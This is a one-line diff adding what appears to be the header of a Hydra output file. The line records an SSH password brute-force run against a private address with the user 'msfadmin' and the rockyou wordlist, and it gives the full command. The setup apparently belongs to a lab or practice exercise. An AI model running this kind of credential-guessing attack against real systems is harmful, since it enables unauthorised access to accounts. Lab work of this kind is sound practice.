@@ -1,0 +1,1 @@
+# Hydra v9.5 run at 2025-11-28 02:39:15 on 192.168.1.105 ssh (hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 -o output.txt -V -K -s 22 192.168.1.105 ssh)
